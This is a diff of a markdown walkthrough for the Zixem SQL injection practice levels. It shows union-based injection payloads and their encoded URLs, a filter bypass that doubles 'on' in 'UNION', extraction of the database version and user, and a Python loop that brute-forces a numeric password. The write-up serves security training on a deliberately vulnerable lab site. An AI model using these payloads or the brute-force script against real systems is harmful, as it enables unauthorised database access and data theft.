@@ -23,21 +23,21 @@ Start:
 > - **Item ID:** 1
 > - **Price:** 20$
 
-=> I guess the Query can be:  
++ I guess the Query can be:  
 `SELECT * FROM <db> WHERE id=1`  
-=> We should add `UNION SELECT 1,2;--`  
++ We should add `UNION SELECT 1,2;--`  
 ***PAYLOAD***: `1 UNION SELECT 1,2;--`  
 `https://zixem.altervista.org/SQLi/level1.php?id=1%20UNION%20SELECT%201,2;--`
 > - The used SELECT statements have a different number of columns **Item ID:**
 > - **Price:** $
 
-=> So it doesn't have 2 columns, let's try again with more to see if the error still exist.  
++ So it doesn't have 2 columns, let's try again with more to see if the error still exist.  
 ***PAYLOAD***: `1 UNION SELECT 1,2,3;--`  
 `https://zixem.altervista.org/SQLi/level1.php?id=1%20UNION%20SELECT%201,2,3;--`
 > - **Item ID:** 1
 > - **Price:** 20$
 
-=> But the Data is not shown in the result. It is caused of the "id=1" data came before our data, let's **invalidate** it first.  
++ But the Data is not shown in the result. It is caused of the "id=1" data came before our data, let's **invalidate** it first.  
 ***PAYLOAD***: `1 AND 1=2 UNION SELECT 1,2,3;--`  
 `https://zixem.altervista.org/SQLi/level1.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3;--`
 > - **Item ID:** 2
@@ -62,29 +62,29 @@ Start:
 > - **Username:** ZiX-M
 > - **Age:** 17
 
-=> Test with prev payload:  
++ Test with prev payload:  
 ***PAYLOAD***: `4 AND 1=2 UNION SELECT 1,2,3,4--`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%20UNION%20SELECT%201,2,3,4--`
 > Nothing to show.
 
-=> It shows nothing. That means it can be take string instead of integer, so we have to add `'` into our payload:  
++ It shows nothing. That means it can be take string instead of integer, so we have to add `'` into our payload:  
 ***PAYLOAD***: `4 AND 1=2' UNION SELECT 1,2,3--`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3--`
 > You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
 
-=> OK, so we have problem with `apostrophe (')`  
++ OK, so we have problem with `apostrophe (')`  
 ***PAYLOAD***: `4 AND 1=2' UNION SELECT 1,2,3--'`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3--%27`
 > The used SELECT statements have a different number of columns
 
-=> It is ok now, but we have select wrong number of columns:  
++ It is ok now, but we have select wrong number of columns:  
 ***PAYLOAD***: `4 AND 1=2' UNION SELECT 1,2,3,4--'`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3,4--%27`
 > - **User-ID:** 1
 > - **Username:** 2
 > - **Age:** 3
 
-=> It is Done. Let's grep the *version()* & *user()*:  
++ It is Done. Let's grep the *version()* & *user()*:  
 ***PAYLOAD***: `4 AND 1=2' UNION SELECT version(),user(),3,4--'`  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
@@ -104,12 +104,12 @@ Start:
 > - **Item Name:** Laptop
 > - **Seller:** Team Digi7al
 
-=> Test with prev Payload:  
++ Test with prev Payload:  
 ***PAYLOAD***: `3 AND 1=2' UNION SELECT version(),user(),3,4--'`  
 `https://zixem.altervista.org/SQLi/level3.php?item=3%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
 > You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uni select version(),user(),3,4--''' at line 1
 
-=> The error message tells us that the statement is being interpreted as `"uni select version(),user(),3,4--''"`, which means that the `on` of union is being filtered out. To combat this, we can add another `on`, so that even after it is removed, the statement still reads union:  
++ The error message tells us that the statement is being interpreted as `"uni select version(),user(),3,4--''"`, which means that the `on` of union is being filtered out. To combat this, we can add another `on`, so that even after it is removed, the statement still reads union:  
 ***PAYLOAD***: `3 AND 1=2' UNIONON SELECT version(),user(),3,4--'`  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level3.php?item=3%20AND%201=2%27%20UNIONON%20SELECT%20version(),user(),3,4--%27`
@@ -130,12 +130,12 @@ Start:
 > - **Writer:**     Team Digi7al
 > - **Price:**      40$
 
-=> Test with prev Payload:  
++ Test with prev Payload:  
 ***PAYLOAD***: `7 AND 1=2' UNION SELECT version(),user(),3,4--'`  
 `https://zixem.altervista.org/SQLi/level4.php?ebookid=7%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
 > The used SELECT statements have a different number of columns.
 
-=> Let's add more column:  
++ Let's add more column:  
 ***PAYLOAD***: `7 AND 1=2' UNION SELECT version(),user(),3,4,5--'`  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level4.php?ebookid=7%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4,5--%27`
@@ -161,17 +161,17 @@ If you want a lead, enter this password.
 ~~~~~~~~~~~~~~~~~~~~~~~~here: /SQLi/md5cracker.php~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 -->
 ```
-=> Let's go to [http://www.zixem.altervista.org/SQLi/md5cracker.php](http://www.zixem.altervista.org/SQLi/md5cracker.php)  
++ Let's go to [http://www.zixem.altervista.org/SQLi/md5cracker.php](http://www.zixem.altervista.org/SQLi/md5cracker.php)  
 > insert your hash with GET method.
 > md5cracker.php?hash=**YourHashHere**
 
-=> Let's try it with `d1fd6ef9af6cb677e09b1b0a68301e0c`:  
++ Let's try it with `d1fd6ef9af6cb677e09b1b0a68301e0c`:  
 [www.zixem.altervista.org/SQLi/md5cracker.php?hash=d1fd6ef9af6cb677e09b1b0a68301e0c](www.zixem.altervista.org/SQLi/md5cracker.php?hash=d1fd6ef9af6cb677e09b1b0a68301e0c)  
 > Try the password: *zixemhf*
 > Return to the login page and get your next step.
 
 ![Login Page 2](./lvl5-login-page2.png)  
-=> Ok, here is the script on Python:
++ Ok, here is the script on Python:
 
 ~~~
 import requests
@@ -184,7 +184,7 @@ for i in range (0, 999999):
         print("Pass Found : %d\n" %i)
         break
 ~~~  
-=> Pass found: 1337
++ Pass found: 1337
 > root@Blue3:.../Zixem# py sqli-level5.py  
 > ...
 > - Wrong Pass : 1334
@@ -220,7 +220,7 @@ Start:
 > You're supposed to pull information out of a table just by guessing the table name & its columns
 > (*note: using information_schema db is not allowed*)...
 
-=> Test with prev Payload:  
++ Test with prev Payload:  
 ***PAYLOAD***: `10 AND 1=2 UNION SELECT 1,2,3,4--`  
 `http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%201,2,3,4--`
 > - Serial number of teacher:  1
@@ -228,12 +228,12 @@ Start:
 > - Age:..............3
 > - Price per 1 leeson: .....................4
 
-=> Ok let's go guessing job:  
++ Ok let's go guessing job:  
 ***PAYLOAD***: `10 AND 1=2 UNION SELECT 1,2,3,4 FROM teacher--`  
 `http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%201,2,3,4%20FROM%20teacher--`
 > Table 'my_zixem.teacher' doesn't exist
 
-=> Typo?
++ Typo?
 ***PAYLOAD***: `10 AND 1=2 UNION SELECT 1,2,3,4 FROM teachers--`  
 `http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%201,2,3,4%20FROM%20teachers--`
 > - Serial number of teacher:  1
@@ -241,7 +241,7 @@ Start:
 > - Age:..............3
 > - Price per 1 leeson: .....................4
 
-=> As we expected. Now guessing until we can grab all value of id=10:  
++ As we expected. Now guessing until we can grab all value of id=10:  
 ***PAYLOAD***: `10 AND 1=2 UNION SELECT id,teachers,teacher_age,price FROM teachers WHERE id=10--`  
 `http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%20id,teachers,teacher_age,price%20FROM%20teachers%20WHERE%20id=10--`
 > Unknown column 'teachers' in 'field list'
